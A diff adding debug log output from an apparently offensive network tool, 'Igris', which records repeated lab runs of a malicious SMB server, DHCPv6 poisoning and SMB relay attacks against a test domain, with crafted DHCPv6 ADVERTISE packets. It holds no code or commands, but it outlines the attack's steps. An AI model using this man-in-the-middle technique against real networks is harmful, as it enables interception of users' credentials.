@@ -1071,3 +1071,949 @@
 2021-12-25 17:25:07.420 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
 2021-12-25 17:25:07.457 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
 2021-12-25 17:25:15.605 | WARNING  | project.mitm.mss:__synchronous_attack:99 - Exiting smb relay attack ...
+2021-12-27 15:42:50.400 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:42:50.403 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:42:50.418 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:42:50.436 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:151 - Starting dhcp6 poisoning...
+2021-12-27 15:42:50.437 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-27 15:42:50.461 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-27 15:42:50.477 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-27 15:42:50.483 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-27 15:42:52.324 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-27 15:43:49.607 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:43:49.609 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:43:49.615 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:43:53.703 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:43:53.704 | WARNING  | project.mitm.mss:__checking_conditions_for_attack:172 - The attack is already running in the background
+2021-12-27 15:43:56.864 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:43:56.864 | SUCCESS  | project.mitm.mss:__ends_process_in_the_background:53 - Finishing mss attack in the background ...
+2021-12-27 15:44:04.363 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:44:04.365 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:44:04.373 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:44:39.341 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:44:39.342 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:44:39.344 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:44:39.347 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-27 15:44:39.350 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-27 15:44:39.350 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-27 15:44:39.351 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-27 15:44:41.004 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-27 15:44:44.653 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:44:44.654 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:44:44.658 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:44:44.666 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:151 - Starting dhcp6 poisoning...
+2021-12-27 15:44:44.666 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-27 15:44:44.671 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-27 15:44:44.678 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-27 15:44:44.679 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-27 15:44:48.876 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-27 15:45:58.185 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:45:58.186 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:45:58.192 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:45:58.206 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:151 - Starting dhcp6 poisoning...
+2021-12-27 15:45:58.209 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-27 15:45:58.231 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-27 15:45:58.234 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-27 15:45:58.242 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-27 15:47:31.588 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-27 15:49:55.774 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:49:55.777 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:49:55.785 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:49:55.799 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:151 - Starting dhcp6 poisoning...
+2021-12-27 15:49:55.800 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-27 15:49:55.808 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-27 15:49:55.816 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-27 15:49:55.818 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-27 15:51:21.825 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:51:21.826 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:51:21.828 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:51:21.833 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:152 - Starting dhcp6 poisoning...
+2021-12-27 15:51:21.834 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-27 15:51:21.841 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-27 15:51:21.843 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-27 15:51:21.843 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-27 15:52:34.722 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-27 15:52:47.661 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:52:47.663 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:52:47.672 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:52:47.688 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:152 - Starting dhcp6 poisoning...
+2021-12-27 15:52:47.689 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-27 15:52:47.697 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-27 15:52:47.706 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-27 15:52:47.708 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-27 15:53:02.551 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-27 15:53:11.400 | DEBUG    | project.mitm.mss:do_mss:268 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:53:11.402 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:53:11.407 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:53:11.421 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:152 - Starting dhcp6 poisoning...
+2021-12-27 15:53:11.422 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-27 15:53:11.428 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-27 15:53:11.429 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-27 15:53:11.430 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-27 15:53:54.416 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-27 15:55:58.495 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-27 15:55:58.497 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-27 15:55:58.503 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-27 15:55:58.511 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:152 - Starting dhcp6 poisoning...
+2021-12-27 15:55:58.512 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-27 15:55:58.523 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-27 15:55:58.524 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-27 15:55:58.525 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-27 15:56:15.877 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-27 15:56:15.879 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:'547' > fe80::11cd:3852:b2df:f387:'546' / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-27 15:56:15.879 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-27 15:56:27.718 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 11:26:53.018 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-29 11:26:53.023 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 11:26:53.040 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 11:26:53.052 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:152 - Starting dhcp6 poisoning...
+2021-12-29 11:26:53.053 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 11:26:53.063 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 11:26:53.064 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 11:26:53.065 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 11:27:16.299 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:16.301 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:16.301 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:27:17.275 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:17.276 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:18.664 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:18.664 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:19.665 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:19.665 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:21.664 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:21.665 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:22.662 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:22.662 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:24.670 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:24.671 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:24.671 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:27:28.668 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:28.669 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:36.665 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:36.665 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:36.666 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:27:52.659 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:27:52.659 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:27:52.659 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:28:24.664 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 11:28:24.664 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:28:24.664 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:31:45.580 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 11:32:05.209 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-29 11:32:05.211 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 11:32:05.219 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 11:32:05.237 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:152 - Starting dhcp6 poisoning...
+2021-12-29 11:32:05.239 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 11:32:05.247 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 11:32:05.248 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 11:32:05.249 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 11:32:06.892 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 11:32:18.271 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-29 11:32:18.272 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 11:32:18.274 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 11:32:18.279 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:152 - Starting dhcp6 poisoning to attack shadow.local
+2021-12-29 11:32:18.279 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 11:32:18.283 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 11:32:18.284 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 11:32:18.285 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 11:32:44.489 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:32:44.490 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:32:44.490 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:32:45.495 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:32:45.495 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:32:46.316 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:32:46.316 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:32:47.319 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:32:47.319 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:32:48.326 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:32:48.327 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:32:48.327 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:32:50.340 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:32:50.340 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:32:54.341 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:32:54.342 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:33:02.379 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:33:02.380 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:33:02.380 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:33:18.396 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
